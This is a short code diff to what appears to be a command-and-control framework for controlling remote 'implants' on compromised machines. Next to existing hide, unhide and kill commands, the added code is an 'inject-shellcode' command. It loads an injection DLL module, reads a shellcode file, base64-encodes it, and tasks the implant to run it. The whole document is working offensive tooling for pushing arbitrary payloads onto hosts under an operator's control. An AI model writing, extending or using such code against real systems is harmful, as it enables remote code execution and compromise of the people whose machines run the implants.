@@ -499,12 +499,28 @@ def runcommand(command, randomuri):
         for line in helpfull:
           if searchterm in line:
             print (line)
-      
+            
       elif "unhide-implant" in command.lower():
         unhide_implant(randomuri)
 
       elif "hide-implant" in command.lower():
         kill_implant(randomuri)
+
+      elif "inject-shellcode" in command.lower():
+        check_module_loaded("Inject.dll", randomuri)
+        readline.set_completer(filecomplete)
+        path = raw_input("Location of shellcode file: ")
+        t = tabCompleter()
+        t.createListCompleter(COMMANDS)
+        readline.set_completer(t.listCompleter)
+        try:
+          shellcodefile = load_file(path)
+          if shellcodefile != None:
+            arch = "64"
+            new_task("$Shellcode%s=\"%s\"" % (arch,base64.b64encode(shellcodefile)), randomuri)
+            new_task(command, randomuri)
+        except Exception as e:
+          print ("Error loading file: %s" % e)
 
       elif "kill-implant" in command.lower() or "exit" in command.lower():
         impid = get_implantdetails(randomuri)
